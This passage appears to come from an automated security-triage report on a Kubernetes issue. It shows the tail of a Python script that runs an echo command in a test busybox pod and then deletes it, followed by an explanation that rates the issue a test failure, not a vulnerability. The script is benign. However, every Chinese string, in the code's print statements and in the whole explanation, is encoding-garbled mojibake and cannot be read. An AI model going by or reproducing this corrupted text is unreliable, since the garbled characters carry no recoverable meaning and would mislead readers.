            print("æˆåŠŸéªŒè¯å‘½ä»¤è¾“å‡ºã€‚")
        else:
            print("è­¦å‘Šï¼šæœªåœ¨è¾“å‡ºä¸­æ‰¾åˆ°é¢„æœŸå­—ç¬¦ä¸²ã€‚")

    except Exception as e:
        print(f"å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        # 5. æ¸…ç†èµ„æº
        print(f"æ­£åœ¨æ¸…ç†å¹¶åˆ é™¤Pod '{pod_name}'...")
        try:
            core_v1.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
            print("Podå·²æˆåŠŸåˆ é™¤ã€‚")
        except client.ApiException as e:
            if e.status == 404:
                print("Podä¸å­˜åœ¨ï¼Œå¯èƒ½å·²æå‰è¢«åˆ é™¤ã€‚")
            else:
                print(f"åˆ é™¤Podæ—¶å‡ºé”™: {e}")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤IssueæŠ¥å‘Šäº†ä¸€ä¸ªå•å…ƒæµ‹è¯•çš„å¤±è´¥ï¼Œè¯¥æµ‹è¯•éªŒè¯çš„æ˜¯Kubernetes APIæœåŠ¡å™¨åœ¨å¤„ç†æµå¼è¿œç¨‹å‘½ä»¤æ—¶å†…éƒ¨ç›‘æ§æŒ‡æ ‡çš„æ­£ç¡®æ€§ã€‚åˆ†æè¡¨æ˜ï¼Œè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugæˆ–æµ‹è¯•ä¸ç¨³å®šçš„é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

å°½ç®¡æ²¡æœ‰å‘ç°é«˜é£é™©é—®é¢˜ï¼Œæˆ‘ä»¬ä»ç„¶æä¾›äº†ä¸€ä¸ªPythonè„šæœ¬ï¼Œå…¶ç›®çš„å¦‚ä¸‹ï¼š

1.  **åŠŸèƒ½æ¼”ç¤º**: è„šæœ¬ä½¿ç”¨Pythonçš„Kuberneteså®¢æˆ·ç«¯åº“ï¼Œæ¼”ç¤ºäº†ä¸Issueæ‰€æµ‹è¯•åŠŸèƒ½ï¼ˆ`RemoteCommand/V5`ï¼‰ç›´æ¥ç›¸å…³çš„å·¥ä½œæµç¨‹ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªPodï¼Œå¹¶é€šè¿‡Kubernetes APIåœ¨Podå†…éƒ¨æ‰§è¡Œäº†ä¸€ä¸ª`echo`å‘½ä»¤ï¼Œç„¶åæ‰“å°å…¶è¾“å‡ºã€‚è¿™æ­£æ˜¯`StreamTranslatorProxy`åœ¨çœŸå®ä¸–ç•Œä¸­çš„ä¸€ä¸ªå…¸å‹ç”¨ä¾‹ã€‚
2.  **ä¸Šä¸‹æ–‡ç†è§£**: é€šè¿‡è¿è¡Œæ­¤è„šæœ¬ï¼Œå¯ä»¥æ›´å¥½åœ°ç†è§£`kubectl exec`èƒŒåçš„APIäº¤äº’æœºåˆ¶ã€‚è„šæœ¬ä¸­çš„`stream.stream`å‡½æ•°å°è£…äº†ä¸APIæœåŠ¡å™¨å»ºç«‹WebSocketè¿æ¥ä»¥è¿›è¡Œæµå¼æ•°æ®äº¤æ¢çš„å¤æ‚è¿‡ç¨‹ã€‚
3.  **éæ¼æ´å¤ç°**: éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œæ­¤è„šæœ¬**ä¸å¤ç°**ä»»ä½•å®‰å…¨æ¼æ´ï¼Œå› ä¸ºå®ƒæœ¬èº«å¹¶ä¸å­˜åœ¨ã€‚è„šæœ¬åªæ˜¯æ¨¡æ‹Ÿäº†æ­£å¸¸çš„ç”¨æˆ·æ“ä½œã€‚Issueä¸­æè¿°çš„é—®é¢˜â€”â€”æŸä¸ªå†…éƒ¨é”™è¯¯è®¡æ•°å™¨æœªæ­£ç¡®å¢åŠ â€”â€”å‘ç”Ÿåœ¨APIæœåŠ¡å™¨å†…éƒ¨ï¼Œæ— æ³•ä¹Ÿæ— éœ€é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬æ¥ç›´æ¥å¤ç°ã€‚è¯¥é—®é¢˜éœ€è¦Kuberneteså¼€å‘è€…åœ¨æºç å±‚é¢è¿›è¡Œè°ƒè¯•å’Œä¿®å¤ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹ï¼š
1.  åŠ è½½æœ¬åœ°`kubeconfig`æ–‡ä»¶ä»¥è·å–é›†ç¾¤è®¿é—®å‡­è¯ã€‚
2.  åœ¨`default`å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªåä¸º`poc-stream-test-pod`çš„`busybox`å®¹å™¨ã€‚
3.  ç­‰å¾…è¯¥Podè¿›å…¥`Running`çŠ¶æ€ã€‚
4.  ä½¿ç”¨`stream`å‡½æ•°è¿æ¥åˆ°Podï¼Œå¹¶åœ¨å…¶ä¸­æ‰§è¡Œ`echo "Hello from inside the pod!"`å‘½ä»¤ã€‚
5.  æ‰“å°å‘½ä»¤çš„è¾“å‡ºï¼Œå¹¶è¿›è¡Œç®€å•éªŒè¯ã€‚
6.  æ— è®ºæˆåŠŸä¸å¦ï¼Œ`finally`å—éƒ½ä¼šç¡®ä¿åˆ é™¤åˆ›å»ºçš„Podï¼Œä»¥æ¸…ç†ç¯å¢ƒã€‚
7.  è„šæœ¬è®¾ç½®äº†120ç§’çš„æ€»ä½“è¶…æ—¶ï¼Œä»¥é˜²æ­¢å› é›†ç¾¤é—®é¢˜è€Œæ°¸ä¹…æŒ‚èµ·ã€‚

---


